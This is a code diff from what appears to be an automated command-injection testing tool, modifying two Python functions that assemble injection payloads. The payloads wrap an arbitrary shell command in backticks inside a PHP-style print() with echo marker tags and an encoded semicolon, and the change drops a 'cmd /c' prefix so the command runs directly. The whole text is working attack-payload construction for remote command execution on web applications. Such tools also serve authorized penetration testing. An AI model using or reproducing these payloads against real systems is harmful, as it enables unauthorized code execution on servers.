@@ -162,7 +162,7 @@ def cmd_execution(separator, TAG, cmd):
     if separator == "":
       payload = ("print(`echo " + TAG + "`." + 
                   "`echo " + TAG + "`." +
-                  "` cmd /c " + cmd + "`." +
+                  "`" + cmd + "`." +
                   "`echo " + TAG + "`." +
                   "`echo " + TAG + "`)"
                 )
@@ -170,7 +170,7 @@ def cmd_execution(separator, TAG, cmd):
     else:
       payload = ("print(`echo '" + TAG + "'" + 
                   separator + "echo '" + TAG + "'" +
-                  separator + " cmd /c " + cmd  +
+                  separator + cmd +
                   separator + "echo '" + TAG + "'" +
                   separator + "echo '" + TAG + "'`)%3B"
                 )
@@ -209,14 +209,14 @@ def cmd_execution_alter_shell(separator, TAG, cmd):
       if separator == "":
         payload = ("print(`echo " + TAG + "`." + 
                     "`echo " + TAG + "`." +
-                    "` cmd /c " + python_payload + "`." +
+                    "`" + python_payload + "`." +
                     "`echo " + TAG + "`." +
                     "`echo " + TAG + "`)"
                   )
       else:
         payload = ("print(`echo '" + TAG + "'" + 
                     separator + "echo '" + TAG + "'" +
-                    separator + " cmd /c " + python_payload +
+                    separator + python_payload +
                     separator + "echo '" + TAG + "'" +
                     separator + "echo '" + TAG + "'`)%3B"
                   )
